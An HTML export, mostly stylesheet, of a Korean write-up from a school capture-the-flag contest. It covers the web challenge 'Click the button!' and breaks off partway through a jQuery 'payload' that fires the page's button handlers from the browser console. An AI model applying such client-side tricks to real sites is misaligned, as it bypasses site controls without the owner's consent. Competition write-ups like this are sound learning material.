@@ -1,0 +1,787 @@
+<!DOCTYPE html>
+<html>
+  <head>
+      <meta charset="utf-8" />
+      <title>writeup</title>
+      <style>body { padding: 0; margin: 0; }
+.markdown-preview-plus-view:not([data-use-github-style]) { padding: 2em; font-size: 1.2em; color: rgb(56, 58, 66); background-color: rgb(250, 250, 250); overflow: auto; }
+.markdown-preview-plus-view:not([data-use-github-style]) > :first-child { margin-top: 0px; }
+.markdown-preview-plus-view:not([data-use-github-style]) h1, .markdown-preview-plus-view:not([data-use-github-style]) h2, .markdown-preview-plus-view:not([data-use-github-style]) h3, .markdown-preview-plus-view:not([data-use-github-style]) h4, .markdown-preview-plus-view:not([data-use-github-style]) h5, .markdown-preview-plus-view:not([data-use-github-style]) h6 { line-height: 1.2; margin-top: 1.5em; margin-bottom: 0.5em; color: rgb(0, 0, 0); }
+.markdown-preview-plus-view:not([data-use-github-style]) h1 { font-size: 2.4em; font-weight: 300; }
+.markdown-preview-plus-view:not([data-use-github-style]) h2 { font-size: 1.8em; font-weight: 400; }
+.markdown-preview-plus-view:not([data-use-github-style]) h3 { font-size: 1.5em; font-weight: 500; }
+.markdown-preview-plus-view:not([data-use-github-style]) h4 { font-size: 1.2em; font-weight: 600; }
+.markdown-preview-plus-view:not([data-use-github-style]) h5 { font-size: 1.1em; font-weight: 600; }
+.markdown-preview-plus-view:not([data-use-github-style]) h6 { font-size: 1em; font-weight: 600; }
+.markdown-preview-plus-view:not([data-use-github-style]) strong { color: rgb(0, 0, 0); }
+.markdown-preview-plus-view:not([data-use-github-style]) del { color: rgb(94, 97, 110); }
+.markdown-preview-plus-view:not([data-use-github-style]) a, .markdown-preview-plus-view:not([data-use-github-style]) a code { color: rgb(82, 111, 255); }
+.markdown-preview-plus-view:not([data-use-github-style]) img { max-width: 100%; }
+.markdown-preview-plus-view:not([data-use-github-style]) > p { margin-top: 0px; margin-bottom: 1.5em; }
+.markdown-preview-plus-view:not([data-use-github-style]) > ul, .markdown-preview-plus-view:not([data-use-github-style]) > ol { margin-bottom: 1.5em; }
+.markdown-preview-plus-view:not([data-use-github-style]) blockquote { margin: 1.5em 0px; font-size: inherit; color: rgb(94, 97, 110); border-color: rgb(209, 209, 210); border-width: 4px; }
+.markdown-preview-plus-view:not([data-use-github-style]) hr { margin: 3em 0px; border-top: 2px dashed rgb(209, 209, 210); background: none; }
+.markdown-preview-plus-view:not([data-use-github-style]) table { margin: 1.5em 0px; }
+.markdown-preview-plus-view:not([data-use-github-style]) th { color: rgb(0, 0, 0); }
+.markdown-preview-plus-view:not([data-use-github-style]) th, .markdown-preview-plus-view:not([data-use-github-style]) td { padding: 0.66em 1em; border: 1px solid rgb(209, 209, 210); }
+.markdown-preview-plus-view:not([data-use-github-style]) pre, .markdown-preview-plus-view:not([data-use-github-style]) code { color: rgb(0, 0, 0); background-color: rgb(234, 234, 235); }
+.markdown-preview-plus-view:not([data-use-github-style]) pre, .markdown-preview-plus-view:not([data-use-github-style]) pre.editor-colors { margin: 1.5em 0px; padding: 1em; font-size: 0.92em; border-radius: 3px; background-color: rgb(240, 240, 240); }
+.markdown-preview-plus-view:not([data-use-github-style]) kbd { color: rgb(0, 0, 0); border-width: 1px 1px 2px; border-style: solid; border-color: rgb(209, 209, 210) rgb(209, 209, 210) rgb(193, 193, 194); border-image: initial; background-color: rgb(234, 234, 235); }
+.markdown-preview-plus-view[data-use-github-style] { font-family: "Helvetica Neue", Helvetica, "Segoe UI", Arial, freesans, sans-serif; line-height: 1.6; word-wrap: break-word; padding: 30px; font-size: 16px; color: rgb(51, 51, 51); background-color: rgb(255, 255, 255); overflow: auto; }
+.markdown-preview-plus-view[data-use-github-style] > :first-child { margin-top: 0px !important; }
+.markdown-preview-plus-view[data-use-github-style] > :last-child { margin-bottom: 0px !important; }
+.markdown-preview-plus-view[data-use-github-style] a:not([href]) { color: inherit; text-decoration: none; }
+.markdown-preview-plus-view[data-use-github-style] .absent { color: rgb(204, 0, 0); }
+.markdown-preview-plus-view[data-use-github-style] .anchor { position: absolute; top: 0px; left: 0px; display: block; padding-right: 6px; padding-left: 30px; margin-left: -30px; }
+.markdown-preview-plus-view[data-use-github-style] .anchor:focus { outline: none; }
+.markdown-preview-plus-view[data-use-github-style] h1, .markdown-preview-plus-view[data-use-github-style] h2, .markdown-preview-plus-view[data-use-github-style] h3, .markdown-preview-plus-view[data-use-github-style] h4, .markdown-preview-plus-view[data-use-github-style] h5, .markdown-preview-plus-view[data-use-github-style] h6 { position: relative; margin-top: 1em; margin-bottom: 16px; font-weight: bold; line-height: 1.4; }
+.markdown-preview-plus-view[data-use-github-style] h1 .octicon-link, .markdown-preview-plus-view[data-use-github-style] h2 .octicon-link, .markdown-preview-plus-view[data-use-github-style] h3 .octicon-link, .markdown-preview-plus-view[data-use-github-style] h4 .octicon-link, .markdown-preview-plus-view[data-use-github-style] h5 .octicon-link, .markdown-preview-plus-view[data-use-github-style] h6 .octicon-link { display: none; color: rgb(0, 0, 0); vertical-align: middle; }
+.markdown-preview-plus-view[data-use-github-style] h1:hover .anchor, .markdown-preview-plus-view[data-use-github-style] h2:hover .anchor, .markdown-preview-plus-view[data-use-github-style] h3:hover .anchor, .markdown-preview-plus-view[data-use-github-style] h4:hover .anchor, .markdown-preview-plus-view[data-use-github-style] h5:hover .anchor, .markdown-preview-plus-view[data-use-github-style] h6:hover .anchor { padding-left: 8px; margin-left: -30px; text-decoration: none; }
+.markdown-preview-plus-view[data-use-github-style] h1:hover .anchor .octicon-link, .markdown-preview-plus-view[data-use-github-style] h2:hover .anchor .octicon-link, .markdown-preview-plus-view[data-use-github-style] h3:hover .anchor .octicon-link, .markdown-preview-plus-view[data-use-github-style] h4:hover .anchor .octicon-link, .markdown-preview-plus-view[data-use-github-style] h5:hover .anchor .octicon-link, .markdown-preview-plus-view[data-use-github-style] h6:hover .anchor .octicon-link { display: inline-block; }
+.markdown-preview-plus-view[data-use-github-style] h1 tt, .markdown-preview-plus-view[data-use-github-style] h2 tt, .markdown-preview-plus-view[data-use-github-style] h3 tt, .markdown-preview-plus-view[data-use-github-style] h4 tt, .markdown-preview-plus-view[data-use-github-style] h5 tt, .markdown-preview-plus-view[data-use-github-style] h6 tt, .markdown-preview-plus-view[data-use-github-style] h1 code, .markdown-preview-plus-view[data-use-github-style] h2 code, .markdown-preview-plus-view[data-use-github-style] h3 code, .markdown-preview-plus-view[data-use-github-style] h4 code, .markdown-preview-plus-view[data-use-github-style] h5 code, .markdown-preview-plus-view[data-use-github-style] h6 code { font-size: inherit; }
+.markdown-preview-plus-view[data-use-github-style] h1 { padding-bottom: 0.3em; font-size: 2.25em; line-height: 1.2; border-bottom: 1px solid rgb(238, 238, 238); }
+.markdown-preview-plus-view[data-use-github-style] h1 .anchor { line-height: 1; }
+.markdown-preview-plus-view[data-use-github-style] h2 { padding-bottom: 0.3em; font-size: 1.75em; line-height: 1.225; border-bottom: 1px solid rgb(238, 238, 238); }
+.markdown-preview-plus-view[data-use-github-style] h2 .anchor { line-height: 1; }
+.markdown-preview-plus-view[data-use-github-style] h3 { font-size: 1.5em; line-height: 1.43; }
+.markdown-preview-plus-view[data-use-github-style] h3 .anchor { line-height: 1.2; }
+.markdown-preview-plus-view[data-use-github-style] h4 { font-size: 1.25em; }
+.markdown-preview-plus-view[data-use-github-style] h4 .anchor { line-height: 1.2; }
+.markdown-preview-plus-view[data-use-github-style] h5 { font-size: 1em; }
+.markdown-preview-plus-view[data-use-github-style] h5 .anchor { line-height: 1.1; }
+.markdown-preview-plus-view[data-use-github-style] h6 { font-size: 1em; color: rgb(119, 119, 119); }
+.markdown-preview-plus-view[data-use-github-style] h6 .anchor { line-height: 1.1; }
+.markdown-preview-plus-view[data-use-github-style] p, .markdown-preview-plus-view[data-use-github-style] blockquote, .markdown-preview-plus-view[data-use-github-style] ul, .markdown-preview-plus-view[data-use-github-style] ol, .markdown-preview-plus-view[data-use-github-style] dl, .markdown-preview-plus-view[data-use-github-style] table, .markdown-preview-plus-view[data-use-github-style] pre { margin-top: 0px; margin-bottom: 16px; }
+.markdown-preview-plus-view[data-use-github-style] hr { height: 4px; padding: 0px; margin: 16px 0px; background-color: rgb(231, 231, 231); border: 0px none; }
+.markdown-preview-plus-view[data-use-github-style] ul, .markdown-preview-plus-view[data-use-github-style] ol { padding-left: 2em; }
+.markdown-preview-plus-view[data-use-github-style] ul.no-list, .markdown-preview-plus-view[data-use-github-style] ol.no-list { padding: 0px; list-style-type: none; }
+.markdown-preview-plus-view[data-use-github-style] ul ul, .markdown-preview-plus-view[data-use-github-style] ul ol, .markdown-preview-plus-view[data-use-github-style] ol ol, .markdown-preview-plus-view[data-use-github-style] ol ul { margin-top: 0px; margin-bottom: 0px; }
+.markdown-preview-plus-view[data-use-github-style] li > p { margin-top: 16px; }
+.markdown-preview-plus-view[data-use-github-style] dl { padding: 0px; }
+.markdown-preview-plus-view[data-use-github-style] dl dt { padding: 0px; margin-top: 16px; font-size: 1em; font-style: italic; font-weight: bold; }
+.markdown-preview-plus-view[data-use-github-style] dl dd { padding: 0px 16px; margin-bottom: 16px; }
+.markdown-preview-plus-view[data-use-github-style] blockquote { padding: 0px 15px; color: rgb(119, 119, 119); border-left: 4px solid rgb(221, 221, 221); }
+.markdown-preview-plus-view[data-use-github-style] blockquote > :first-child { margin-top: 0px; }
+.markdown-preview-plus-view[data-use-github-style] blockquote > :last-child { margin-bottom: 0px; }
+.markdown-preview-plus-view[data-use-github-style] table { display: block; width: 100%; overflow: auto; word-break: keep-all; }
+.markdown-preview-plus-view[data-use-github-style] table th { font-weight: bold; }
+.markdown-preview-plus-view[data-use-github-style] table th, .markdown-preview-plus-view[data-use-github-style] table td { padding: 6px 13px; border: 1px solid rgb(221, 221, 221); }
+.markdown-preview-plus-view[data-use-github-style] table tr { background-color: rgb(255, 255, 255); border-top: 1px solid rgb(204, 204, 204); }
+.markdown-preview-plus-view[data-use-github-style] table tr:nth-child(2n) { background-color: rgb(248, 248, 248); }
+.markdown-preview-plus-view[data-use-github-style] img { max-width: 100%; box-sizing: border-box; }
+.markdown-preview-plus-view[data-use-github-style] .emoji { max-width: none; }
+.markdown-preview-plus-view[data-use-github-style] span.frame { display: block; overflow: hidden; }
+.markdown-preview-plus-view[data-use-github-style] span.frame > span { display: block; float: left; width: auto; padding: 7px; margin: 13px 0px 0px; overflow: hidden; border: 1px solid rgb(221, 221, 221); }
+.markdown-preview-plus-view[data-use-github-style] span.frame span img { display: block; float: left; }
+.markdown-preview-plus-view[data-use-github-style] span.frame span span { display: block; padding: 5px 0px 0px; clear: both; color: rgb(51, 51, 51); }
+.markdown-preview-plus-view[data-use-github-style] span.align-center { display: block; overflow: hidden; clear: both; }
+.markdown-preview-plus-view[data-use-github-style] span.align-center > span { display: block; margin: 13px auto 0px; overflow: hidden; text-align: center; }
+.markdown-preview-plus-view[data-use-github-style] span.align-center span img { margin: 0px auto; text-align: center; }
+.markdown-preview-plus-view[data-use-github-style] span.align-right { display: block; overflow: hidden; clear: both; }
+.markdown-preview-plus-view[data-use-github-style] span.align-right > span { display: block; margin: 13px 0px 0px; overflow: hidden; text-align: right; }
+.markdown-preview-plus-view[data-use-github-style] span.align-right span img { margin: 0px; text-align: right; }
+.markdown-preview-plus-view[data-use-github-style] span.float-left { display: block; float: left; margin-right: 13px; overflow: hidden; }
+.markdown-preview-plus-view[data-use-github-style] span.float-left span { margin: 13px 0px 0px; }
+.markdown-preview-plus-view[data-use-github-style] span.float-right { display: block; float: right; margin-left: 13px; overflow: hidden; }
+.markdown-preview-plus-view[data-use-github-style] span.float-right > span { display: block; margin: 13px auto 0px; overflow: hidden; text-align: right; }
+.markdown-preview-plus-view[data-use-github-style] code, .markdown-preview-plus-view[data-use-github-style] tt { padding: 0.2em 0px; margin: 0px; font-size: 85%; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px; }
+.markdown-preview-plus-view[data-use-github-style] code::before, .markdown-preview-plus-view[data-use-github-style] tt::before, .markdown-preview-plus-view[data-use-github-style] code::after, .markdown-preview-plus-view[data-use-github-style] tt::after { letter-spacing: -0.2em; content: " "; }
+.markdown-preview-plus-view[data-use-github-style] code br, .markdown-preview-plus-view[data-use-github-style] tt br { display: none; }
+.markdown-preview-plus-view[data-use-github-style] del code { text-decoration: inherit; }
+.markdown-preview-plus-view[data-use-github-style] pre > code { padding: 0px; margin: 0px; font-size: 100%; word-break: normal; white-space: pre; background: transparent; border: 0px; }
+.markdown-preview-plus-view[data-use-github-style] .highlight { margin-bottom: 16px; }
+.markdown-preview-plus-view[data-use-github-style] .highlight pre, .markdown-preview-plus-view[data-use-github-style] pre { padding: 16px; overflow: auto; font-size: 85%; line-height: 1.45; background-color: rgb(247, 247, 247); border-radius: 3px; }
+.markdown-preview-plus-view[data-use-github-style] .highlight pre { margin-bottom: 0px; word-break: normal; }
+.markdown-preview-plus-view[data-use-github-style] pre { word-wrap: normal; }
+.markdown-preview-plus-view[data-use-github-style] pre code, .markdown-preview-plus-view[data-use-github-style] pre tt { display: inline; max-width: initial; padding: 0px; margin: 0px; overflow: initial; line-height: inherit; word-wrap: normal; background-color: transparent; border: 0px; }
+.markdown-preview-plus-view[data-use-github-style] pre code::before, .markdown-preview-plus-view[data-use-github-style] pre tt::before, .markdown-preview-plus-view[data-use-github-style] pre code::after, .markdown-preview-plus-view[data-use-github-style] pre tt::after { content: normal; }
+.markdown-preview-plus-view[data-use-github-style] kbd { display: inline-block; padding: 3px 5px; font-size: 11px; line-height: 10px; color: rgb(85, 85, 85); vertical-align: middle; background-color: rgb(252, 252, 252); border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204) rgb(204, 204, 204) rgb(187, 187, 187); border-image: initial; border-radius: 3px; box-shadow: rgb(187, 187, 187) 0px -1px 0px inset; }
+.markdown-preview-plus-view[data-use-github-style] a { color: rgb(51, 122, 183); }
+.markdown-preview-plus-view[data-use-github-style] pre, .markdown-preview-plus-view[data-use-github-style] code { color: inherit; }
+.markdown-preview-plus-view[data-use-github-style] pre, .markdown-preview-plus-view[data-use-github-style] pre.editor-colors { padding: 0.8em 1em; margin-bottom: 1em; font-size: 0.85em; border-radius: 4px; overflow: auto; }
+.markdown-preview-plus-view { height: 100%; display: block; }
+.markdown-preview-plus-view .emoji { max-width: 1em !important; }
+.scrollbars-visible-always .markdown-preview-plus-view pre.editor-colors .vertical-scrollbar, .scrollbars-visible-always .markdown-preview-plus-view pre.editor-colors .horizontal-scrollbar { visibility: hidden; }
+.scrollbars-visible-always .markdown-preview-plus-view pre.editor-colors:hover .vertical-scrollbar, .scrollbars-visible-always .markdown-preview-plus-view pre.editor-colors:hover .horizontal-scrollbar { visibility: visible; }
+.markdown-preview-plus-view del { text-decoration: none; position: relative; }
+.markdown-preview-plus-view del::after { border-bottom: 1px solid black; content: ""; left: 0px; position: absolute; right: 0px; top: 50%; }
+.markdown-preview-plus-view .flash { animation: flash 1s ease-out 1; outline: rgba(255, 0, 0, 0) solid 1px; }
+.markdown-preview-plus-view .flash:not(li) { display: block; }
+.bracket-matcher .region {
+  border-bottom: 1px dotted lime;
+  position: absolute;
+}
+.line-number.bracket-matcher.bracket-matcher {
+  color: #383a42;
+  background-color: #e5e5e6;
+}
+
+.spell-check-misspelling .region {
+  border-bottom: 2px dotted rgba(255, 51, 51, 0.75);
+}
+.spell-check-corrections {
+  width: 25em !important;
+}
+
+pre.editor-colors {
+  background-color: #fafafa;
+  color: #383a42;
+}
+pre.editor-colors .line.cursor-line {
+  background-color: rgba(56, 58, 66, 0.05);
+}
+pre.editor-colors .invisible {
+  color: #383a42;
+}
+pre.editor-colors .cursor {
+  border-left: 2px solid #526fff;
+}
+pre.editor-colors .selection .region {
+  background-color: #e5e5e6;
+}
+pre.editor-colors .bracket-matcher .region {
+  border-bottom: 1px solid #526fff;
+  box-sizing: border-box;
+}
+pre.editor-colors .invisible-character {
+  color: rgba(56, 58, 66, 0.2);
+}
+pre.editor-colors .indent-guide {
+  color: rgba(56, 58, 66, 0.2);
+}
+pre.editor-colors .wrap-guide {
+  background-color: rgba(56, 58, 66, 0.2);
+}
+pre.editor-colors .find-result .region.region.region,
+pre.editor-colors .current-result .region.region.region {
+  border-radius: 2px;
+  background-color: rgba(82, 111, 255, 0.2);
+  transition: border-color 0.4s;
+}
+pre.editor-colors .find-result .region.region.region {
+  border: 2px solid transparent;
+}
+pre.editor-colors .current-result .region.region.region {
+  border: 2px solid #526fff;
+  transition-duration: .1s;
+}
+pre.editor-colors .gutter .line-number {
+  color: #9d9d9f;
+  -webkit-font-smoothing: antialiased;
+}
+pre.editor-colors .gutter .line-number.cursor-line {
+  color: #383a42;
+  background-color: #e5e5e6;
+}
+pre.editor-colors .gutter .line-number.cursor-line-no-selection {
+  background-color: transparent;
+}
+pre.editor-colors .gutter .line-number .icon-right {
+  color: #383a42;
+}
+pre.editor-colors .gutter:not(.git-diff-icon) .line-number.git-line-removed.git-line-removed::before {
+  bottom: -3px;
+}
+pre.editor-colors .gutter:not(.git-diff-icon) .line-number.git-line-removed::after {
+  content: "";
+  position: absolute;
+  left: 0px;
+  bottom: 0px;
+  width: 25px;
+  border-bottom: 1px dotted rgba(255, 20, 20, 0.5);
+  pointer-events: none;
+}
+pre.editor-colors .gutter .line-number.folded,
+pre.editor-colors .gutter .line-number:after,
+pre.editor-colors .fold-marker:after {
+  color: #383a42;
+}
+.syntax--comment {
+  color: #a0a1a7;
+  font-style: italic;
+}
+.syntax--comment .syntax--markup.syntax--link {
+  color: #a0a1a7;
+}
+.syntax--entity.syntax--name.syntax--type {
+  color: #c18401;
+}
+.syntax--entity.syntax--other.syntax--inherited-class {
+  color: #50a14f;
+}
+.syntax--keyword {
+  color: #a626a4;
+}
+.syntax--keyword.syntax--control {
+  color: #a626a4;
+}
+.syntax--keyword.syntax--operator {
+  color: #383a42;
+}
+.syntax--keyword.syntax--other.syntax--special-method {
+  color: #4078f2;
+}
+.syntax--keyword.syntax--other.syntax--unit {
+  color: #986801;
+}
+.syntax--storage {
+  color: #a626a4;
+}
+.syntax--storage.syntax--type.syntax--annotation,
+.syntax--storage.syntax--type.syntax--primitive {
+  color: #a626a4;
+}
+.syntax--storage.syntax--modifier.syntax--package,
+.syntax--storage.syntax--modifier.syntax--import {
+  color: #383a42;
+}
+.syntax--constant {
+  color: #986801;
+}
+.syntax--constant.syntax--variable {
+  color: #986801;
+}
+.syntax--constant.syntax--character.syntax--escape {
+  color: #0184bc;
+}
+.syntax--constant.syntax--numeric {
+  color: #986801;
+}
+.syntax--constant.syntax--other.syntax--color {
+  color: #0184bc;
+}
+.syntax--constant.syntax--other.syntax--symbol {
+  color: #0184bc;
+}
+.syntax--variable {
+  color: #e45649;
+}
+.syntax--variable.syntax--interpolation {
+  color: #ca1243;
+}
+.syntax--variable.syntax--parameter {
+  color: #383a42;
+}
+.syntax--string {
+  color: #50a14f;
+}
+.syntax--string.syntax--regexp {
+  color: #0184bc;
+}
+.syntax--string.syntax--regexp .syntax--source.syntax--ruby.syntax--embedded {
+  color: #c18401;
+}
+.syntax--string.syntax--other.syntax--link {
+  color: #e45649;
+}
+.syntax--punctuation.syntax--definition.syntax--comment {
+  color: #a0a1a7;
+}
+.syntax--punctuation.syntax--definition.syntax--method-parameters,
+.syntax--punctuation.syntax--definition.syntax--function-parameters,
+.syntax--punctuation.syntax--definition.syntax--parameters,
+.syntax--punctuation.syntax--definition.syntax--separator,
+.syntax--punctuation.syntax--definition.syntax--seperator,
+.syntax--punctuation.syntax--definition.syntax--array {
+  color: #383a42;
+}
+.syntax--punctuation.syntax--definition.syntax--heading,
+.syntax--punctuation.syntax--definition.syntax--identity {
+  color: #4078f2;
+}
+.syntax--punctuation.syntax--definition.syntax--bold {
+  color: #c18401;
+  font-weight: bold;
+}
+.syntax--punctuation.syntax--definition.syntax--italic {
+  color: #a626a4;
+  font-style: italic;
+}
+.syntax--punctuation.syntax--section.syntax--embedded {
+  color: #ca1243;
+}
+.syntax--punctuation.syntax--section.syntax--method,
+.syntax--punctuation.syntax--section.syntax--class,
+.syntax--punctuation.syntax--section.syntax--inner-class {
+  color: #383a42;
+}
+.syntax--support.syntax--class {
+  color: #c18401;
+}
+.syntax--support.syntax--type {
+  color: #0184bc;
+}
+.syntax--support.syntax--function {
+  color: #0184bc;
+}
+.syntax--support.syntax--function.syntax--any-method {
+  color: #4078f2;
+}
+.syntax--entity.syntax--name.syntax--function {
+  color: #4078f2;
+}
+.syntax--entity.syntax--name.syntax--class,
+.syntax--entity.syntax--name.syntax--type.syntax--class {
+  color: #c18401;
+}
+.syntax--entity.syntax--name.syntax--section {
+  color: #4078f2;
+}
+.syntax--entity.syntax--name.syntax--tag {
+  color: #e45649;
+}
+.syntax--entity.syntax--other.syntax--attribute-name {
+  color: #986801;
+}
+.syntax--entity.syntax--other.syntax--attribute-name.syntax--id {
+  color: #4078f2;
+}
+.syntax--meta.syntax--class {
+  color: #c18401;
+}
+.syntax--meta.syntax--class.syntax--body {
+  color: #383a42;
+}
+.syntax--meta.syntax--method-call,
+.syntax--meta.syntax--method {
+  color: #383a42;
+}
+.syntax--meta.syntax--definition.syntax--variable {
+  color: #e45649;
+}
+.syntax--meta.syntax--link {
+  color: #986801;
+}
+.syntax--meta.syntax--require {
+  color: #4078f2;
+}
+.syntax--meta.syntax--selector {
+  color: #a626a4;
+}
+.syntax--meta.syntax--separator {
+  color: #383a42;
+}
+.syntax--meta.syntax--tag {
+  color: #383a42;
+}
+.syntax--underline {
+  text-decoration: underline;
+}
+.syntax--none {
+  color: #383a42;
+}
+.syntax--invalid.syntax--deprecated {
+  color: #000000 !important;
+  background-color: #f2a60d !important;
+}
+.syntax--invalid.syntax--illegal {
+  color: white !important;
+  background-color: #ff1414 !important;
+}
+.syntax--markup.syntax--bold {
+  color: #986801;
+  font-weight: bold;
+}
+.syntax--markup.syntax--changed {
+  color: #a626a4;
+}
+.syntax--markup.syntax--deleted {
+  color: #e45649;
+}
+.syntax--markup.syntax--italic {
+  color: #a626a4;
+  font-style: italic;
+}
+.syntax--markup.syntax--heading {
+  color: #e45649;
+}
+.syntax--markup.syntax--heading .syntax--punctuation.syntax--definition.syntax--heading {
+  color: #4078f2;
+}
+.syntax--markup.syntax--link {
+  color: #0184bc;
+}
+.syntax--markup.syntax--inserted {
+  color: #50a14f;
+}
+.syntax--markup.syntax--quote {
+  color: #986801;
+}
+.syntax--markup.syntax--raw {
+  color: #50a14f;
+}
+.syntax--source.syntax--c .syntax--keyword.syntax--operator {
+  color: #a626a4;
+}
+.syntax--source.syntax--cpp .syntax--keyword.syntax--operator {
+  color: #a626a4;
+}
+.syntax--source.syntax--cs .syntax--keyword.syntax--operator {
+  color: #a626a4;
+}
+.syntax--source.syntax--css .syntax--property-name,
+.syntax--source.syntax--css .syntax--property-value {
+  color: #696c77;
+}
+.syntax--source.syntax--css .syntax--property-name.syntax--support,
+.syntax--source.syntax--css .syntax--property-value.syntax--support {
+  color: #383a42;
+}
+.syntax--source.syntax--elixir .syntax--source.syntax--embedded.syntax--source {
+  color: #383a42;
+}
+.syntax--source.syntax--elixir .syntax--constant.syntax--language,
+.syntax--source.syntax--elixir .syntax--constant.syntax--numeric,
+.syntax--source.syntax--elixir .syntax--constant.syntax--definition {
+  color: #4078f2;
+}
+.syntax--source.syntax--elixir .syntax--variable.syntax--definition,
+.syntax--source.syntax--elixir .syntax--variable.syntax--anonymous {
+  color: #a626a4;
+}
+.syntax--source.syntax--elixir .syntax--parameter.syntax--variable.syntax--function {
+  color: #986801;
+  font-style: italic;
+}
+.syntax--source.syntax--elixir .syntax--quoted {
+  color: #50a14f;
+}
+.syntax--source.syntax--elixir .syntax--keyword.syntax--special-method,
+.syntax--source.syntax--elixir .syntax--embedded.syntax--section,
+.syntax--source.syntax--elixir .syntax--embedded.syntax--source.syntax--empty {
+  color: #e45649;
+}
+.syntax--source.syntax--elixir .syntax--readwrite.syntax--module .syntax--punctuation {
+  color: #e45649;
+}
+.syntax--source.syntax--elixir .syntax--regexp.syntax--section,
+.syntax--source.syntax--elixir .syntax--regexp.syntax--string {
+  color: #ca1243;
+}
+.syntax--source.syntax--elixir .syntax--separator,
+.syntax--source.syntax--elixir .syntax--keyword.syntax--operator {
+  color: #986801;
+}
+.syntax--source.syntax--elixir .syntax--variable.syntax--constant {
+  color: #c18401;
+}
+.syntax--source.syntax--elixir .syntax--array,
+.syntax--source.syntax--elixir .syntax--scope,
+.syntax--source.syntax--elixir .syntax--section {
+  color: #696c77;
+}
+.syntax--source.syntax--gfm .syntax--markup {
+  -webkit-font-smoothing: auto;
+}
+.syntax--source.syntax--gfm .syntax--link .syntax--entity {
+  color: #4078f2;
+}
+.syntax--source.syntax--go .syntax--storage.syntax--type.syntax--string {
+  color: #a626a4;
+}
+.syntax--source.syntax--ini .syntax--keyword.syntax--other.syntax--definition.syntax--ini {
+  color: #e45649;
+}
+.syntax--source.syntax--java .syntax--storage.syntax--modifier.syntax--import {
+  color: #c18401;
+}
+.syntax--source.syntax--java .syntax--storage.syntax--type {
+  color: #c18401;
+}
+.syntax--source.syntax--java .syntax--keyword.syntax--operator.syntax--instanceof {
+  color: #a626a4;
+}
+.syntax--source.syntax--java-properties .syntax--meta.syntax--key-pair {
+  color: #e45649;
+}
+.syntax--source.syntax--java-properties .syntax--meta.syntax--key-pair > .syntax--punctuation {
+  color: #383a42;
+}
+.syntax--source.syntax--js .syntax--keyword.syntax--operator {
+  color: #0184bc;
+}
+.syntax--source.syntax--js .syntax--keyword.syntax--operator.syntax--delete,
+.syntax--source.syntax--js .syntax--keyword.syntax--operator.syntax--in,
+.syntax--source.syntax--js .syntax--keyword.syntax--operator.syntax--of,
+.syntax--source.syntax--js .syntax--keyword.syntax--operator.syntax--instanceof,
+.syntax--source.syntax--js .syntax--keyword.syntax--operator.syntax--new,
+.syntax--source.syntax--js .syntax--keyword.syntax--operator.syntax--typeof,
+.syntax--source.syntax--js .syntax--keyword.syntax--operator.syntax--void {
+  color: #a626a4;
+}
+.syntax--source.syntax--json .syntax--meta.syntax--structure.syntax--dictionary.syntax--json > .syntax--string.syntax--quoted.syntax--json {
+  color: #e45649;
+}
+.syntax--source.syntax--json .syntax--meta.syntax--structure.syntax--dictionary.syntax--json > .syntax--string.syntax--quoted.syntax--json > .syntax--punctuation.syntax--string {
+  color: #e45649;
+}
+.syntax--source.syntax--json .syntax--meta.syntax--structure.syntax--dictionary.syntax--json > .syntax--value.syntax--json > .syntax--string.syntax--quoted.syntax--json,
+.syntax--source.syntax--json .syntax--meta.syntax--structure.syntax--array.syntax--json > .syntax--value.syntax--json > .syntax--string.syntax--quoted.syntax--json,
+.syntax--source.syntax--json .syntax--meta.syntax--structure.syntax--dictionary.syntax--json > .syntax--value.syntax--json > .syntax--string.syntax--quoted.syntax--json > .syntax--punctuation,
+.syntax--source.syntax--json .syntax--meta.syntax--structure.syntax--array.syntax--json > .syntax--value.syntax--json > .syntax--string.syntax--quoted.syntax--json > .syntax--punctuation {
+  color: #50a14f;
+}
+.syntax--source.syntax--json .syntax--meta.syntax--structure.syntax--dictionary.syntax--json > .syntax--constant.syntax--language.syntax--json,
+.syntax--source.syntax--json .syntax--meta.syntax--structure.syntax--array.syntax--json > .syntax--constant.syntax--language.syntax--json {
+  color: #0184bc;
+}
+.syntax--source.syntax--ruby .syntax--constant.syntax--other.syntax--symbol > .syntax--punctuation {
+  color: inherit;
+}
+.syntax--source.syntax--php .syntax--class.syntax--bracket {
+  color: #383a42;
+}
+.syntax--source.syntax--python .syntax--keyword.syntax--operator.syntax--logical.syntax--python {
+  color: #a626a4;
+}
+.syntax--source.syntax--python .syntax--variable.syntax--parameter {
+  color: #986801;
+}
+</style>
+  </head>
+  <body class="markdown-preview-plus-view">
+    <h1>선린 교내 해킹방어대회</h1>
+<h3>최종 5등함</h3>
+<h3>Team 잘생긴사람들</h3>
+<h6>팀명은 다들 잘생긴 사람들이라서 이렇게 지었습니다.</h6>
+<h3>저는 웹만 풀어서 <s>유사해킹</s>웹만 씁니다.</h3>
+<h3>발표용 ppt파일도 있습니다.</h3>
+<h2>Click the button! (점수 기억안남)</h2>
+<blockquote>
+<p><a href="http://game.withphp.com/click_the_button/index.php">http://game.withphp.com/click_the_button/index.php</a><br>
+문제는 위 링크에서 풀어볼 수 있다.</p>
+</blockquote>
+<ul>
+<li>button 1부터 10, 총 10개가 있고 꼭 1부터 10까지 차례대로 눌러야 플래그가 나온다.</li>
+</ul>
+<h3>payload</h3>
+<ul>
+<li>
+<h4>payload 1</h4>
+</li>
+</ul>
+<pre class="editor-colors lang-javascript"><span class="syntax--source syntax--js"><span class="syntax--meta syntax--function-call syntax--js"><span class="syntax--entity syntax--name syntax--function syntax--js"><span>$</span></span><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--punctuation syntax--definition syntax--arguments syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--string syntax--quoted syntax--double syntax--js"><span class="syntax--punctuation syntax--definition syntax--string syntax--begin syntax--js"><span>"</span></span><span>[onclick='click_button(1, this)']</span><span class="syntax--punctuation syntax--definition syntax--string syntax--end syntax--js"><span>"</span></span></span><span class="syntax--punctuation syntax--definition syntax--arguments syntax--end syntax--bracket syntax--round syntax--js"><span>)</span></span></span></span><span class="syntax--meta syntax--method-call syntax--js"><span class="syntax--meta syntax--delimiter syntax--method syntax--period syntax--js"><span>.</span></span><span class="syntax--support syntax--function syntax--dom syntax--js"><span>click</span></span><span class="syntax--meta syntax--arguments syntax--js"><span class="syntax--punctuation syntax--definition syntax--arguments syntax--begin syntax--bracket syntax--round syntax--js"><span>(</span></span><span class="syntax--punctuation syntax--definition syntax--arguments syntax--end syntax--bracket syntax--round 